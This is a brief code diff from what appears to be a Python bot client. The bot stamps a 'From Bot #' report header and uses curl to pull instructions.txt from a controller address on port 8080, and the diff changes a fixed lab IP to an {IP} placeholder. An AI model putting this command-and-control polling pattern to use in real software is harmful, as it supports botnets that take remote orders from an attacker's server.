@@ -61,7 +61,7 @@ def instructions():
 	current_date = x.strftime("%m/%d/%Y")
 	myname = open('name.txt', 'r').read()
 	header = "echo 'From Bot #"+myname+" on "+current_date+" at "+current_time+" ' >> sendthis.txt"
-	os.system('curl http://10.0.2.15:8080/instructions.txt > response.txt')
+	os.system('curl http://{IP}:8080/instructions.txt > response.txt')
 	os.system(header)
 	with open('response.txt') as input_file:
 		send = 0
